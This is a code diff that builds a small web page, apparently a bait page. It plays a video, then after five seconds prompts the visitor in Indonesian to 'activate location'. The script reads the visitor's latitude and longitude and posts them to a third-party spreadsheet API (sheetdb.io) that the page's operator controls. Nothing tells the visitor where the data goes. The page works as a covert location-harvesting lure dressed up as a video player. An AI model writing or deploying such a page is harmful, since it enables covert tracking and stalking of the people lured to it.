@@ -1,11 +1,37 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Video</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+
+<body style="margin:0; background:black;">
+
+<video id="vid" width="100%" controls autoplay muted playsinline>
+  <source src="https://files.catbox.moe/a6i2nt.mp4" type="video/mp4">
+</video>
+
+<div id="box" style="display:none; position:fixed; bottom:0; width:100%; background:black; color:white; text-align:center; padding:15px;">
+  <p>Aktifkan lokasi</p>
+  <button onclick="go()" style="padding:10px;">Aktifkan</button>
+</div>
+
 <script>
+let v = document.getElementById("vid");
+
+v.ontimeupdate = () => {
+  if (v.currentTime > 5) {
+    document.getElementById("box").style.display = "block";
+  }
+};
+
 function go() {
   navigator.geolocation.getCurrentPosition(pos => {
 
     let lat = pos.coords.latitude;
     let lon = pos.coords.longitude;
 
-    fetch("https://sheetdb.io/api/v1/2ipys7fb7fh8h", {
+    fetch("https://sheetdb.io/api/v1/av906p3tie5ax", {
       method: "POST",
       headers: {"Content-Type": "application/json"},
       body: JSON.stringify({
@@ -22,3 +48,6 @@ function go() {
   });
 }
 </script>
+
+</body>
+</html>
